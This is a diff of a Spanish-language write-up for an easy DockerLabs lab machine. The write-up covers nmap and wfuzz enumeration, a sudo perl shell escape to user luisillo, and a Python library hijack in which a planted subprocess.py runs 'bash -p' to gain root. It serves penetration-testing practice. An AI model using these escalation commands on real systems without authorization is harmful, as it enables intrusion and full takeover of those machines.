@@ -1,5 +1,5 @@
 Propiedades:
-- OS: Linux 
+- OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
 - Tags: #ssh #lfi #dockerlabs
@@ -32,7 +32,7 @@ nmap -p22,80 -sCV --min-rate 5000 -Pn -n -oN ports.txt 172.17.0.3
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
 |_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
@@ -74,13 +74,13 @@ Podemos tratar de fuzzear por parámetros en el `index.php` ya que no tenemos mu
 - Parametro `secret` encontrada
 
 ```bash
-> wfuzz -c --hc=403 --hw=169 -z file,/home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://172.17.0.3/index.php?FUZZ=test 
+> wfuzz -c --hc=403 --hw=169 -z file,/home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://172.17.0.3/index.php?FUZZ=test
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload              
+ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
-000000944:   200        62 L     166 W      2582 Ch     "secret"   
+000000944:   200        62 L     166 W      2582 Ch     "secret"
 ```
 
 ## Explotación
@@ -117,9 +117,8 @@ Con la clave _rsa_ guardada en nuestro sistema procedimos a darle permisos y a c
 
 ## Escalada a usuario luisillo
 
-Dentro del sistema lo primero que hicimos fue listar binarios que pudiéramos ejecutar como.
+Dentro del sistema lo primero que hicimos fue listar binarios que pudiéramos ejecutar como `root` o algun otro usuario.
 
-- En este caso encontramos uno el cual se podía ejecutar con el usuario luisillo
 
 ```bash
 > sudo -l
@@ -128,15 +127,18 @@ User vaxei may run the following commands on 2dfea34fe709:
     (luisillo) NOPASSWD: /usr/bin/perl
 ```
 
-Procedimos a explotar el binario _perl_
+- En este caso encontramos el binario `perl` que puede ser ejecutado como el usuario luisillo sin necesidad de contraseña.
+
+
+Procedimos a explotar el binario _perl_ y migrar al usuario `luisillo`
 
 ```bash
-> sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";' 
+> sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
 ```
 
 ![](assets/Pasted%20image%2020251101212006.png)
 
-Denuevo realizamos el mismo proceso de buscar binarios con permisos de ejecución:
+Denuevo realizamos el mismo proceso de enumerar binarios con privilegios de `SUDO`.
 
 ```bash
 > sudo -l
@@ -144,11 +146,13 @@ User luisillo may run the following commands on 2dfea34fe709:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
 ```
 
-Encontramos un script en python que procedimos a inspeccionar y ejecutar para saber que hacia:
+- Encontramos un script de python en `/opt/paw.py` que puede ser ejecutado como cualquier usuario sin necesidad de contraseña.
+
+Inspeccione el script para ver que hace:
 
 ![](assets/Pasted%20image%2020251101212209.png)
 
-El script aparentemente llama a un modulo llamado `subprocess` que no existe, por lo cual podemos realizar un **Python Library Hijacking** que consiste en forzar a `Python` para que cargue una librería malicioso en lugar de la legitima aprovechando como `Python` busca modulos.
+Al ejecutar el script me di cuenta que llama a un modulo `subprocess` que no existe, por lo cual podemos realizar un **Python Library Hijacking** que consiste en forzar a `Python` para que cargue una librería malicioso en lugar de la legitima aprovechando como `Python` busca modulos.
 
 ```python
 $ cat subprocess.py
@@ -156,7 +160,11 @@ import os
 os.system("bash -p")
 ```
 
-Procedimos a ejecutar el script principal `paw.py` como el usuario root.
+- Este script debe de estar en el mismo directorio que el scrip `paw.py`
+
+Ahora puedo ejecutar como `root` el script `paw.py` para spawnear una bash.
+
+- Python intentará importar la librería `subprocess` y Debido al orden de búsqueda de módulos, se cargará primero el archivo `subprocess` malicioso ubicado en el mismo directorio.
 
 ```bash
 $ sudo -u root /usr/bin/python3 /opt/paw.py
